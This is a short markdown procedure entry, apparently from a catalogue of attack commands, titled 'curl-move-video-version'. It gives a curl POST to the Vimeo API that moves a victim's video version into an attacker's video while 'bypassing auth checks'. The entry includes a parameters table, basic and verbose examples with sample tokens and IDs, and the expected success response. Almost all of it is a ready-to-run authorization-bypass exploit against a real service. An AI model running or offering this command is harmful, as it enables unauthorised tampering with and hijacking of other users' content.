---
data: >-
  curl -X POST -H "Authorization: bearer YOUR_ATTACKER_TOKEN" -d '{"version_id":
  VICTIM_VERSION_ID}' https://api.vimeo.com/videos/ATTACKER_VIDEO_ID/versions
tags:
  - api-modify
type: command
output: 200 OK with confirmation
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: d8844bde-b43a-4b1e-835a-2567d5f5bfe7
created_at: '2025-12-14T17:32:39.441Z'
updated_at: '2025-12-14T17:32:39.441Z'
verified: false
validated: true
submitted: true
---
# curl-move-video-version

## Command

```bash
curl -X POST -H "Authorization: bearer YOUR_ATTACKER_TOKEN" -d '{"version_id": VICTIM_VERSION_ID}' https://api.vimeo.com/videos/ATTACKER_VIDEO_ID/versions
```

## Description

Sends a POST request to move a specified video version to the target video's versions list, bypassing auth checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method for creation | Yes |
| `-H "Authorization: bearer TOKEN"` | API token | Yes |
| `-d '{"version_id": ID}'` | JSON payload with version ID | Yes |
| `ATTACKER_VIDEO_ID` | Attacker's video ID | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Authorization: bearer abc123" -d '{"version_id": 789}' https://api.vimeo.com/videos/456/versions
```

### Advanced Usage

```bash
curl -X POST -H "Authorization: bearer abc123" -d '{"version_id": 789}' -v https://api.vimeo.com/videos/456/versions
```

## Expected Output

{"id": "new_version_link", "status": "success"}. Confirms version moved.

## Related

- [[Related Procedure]]
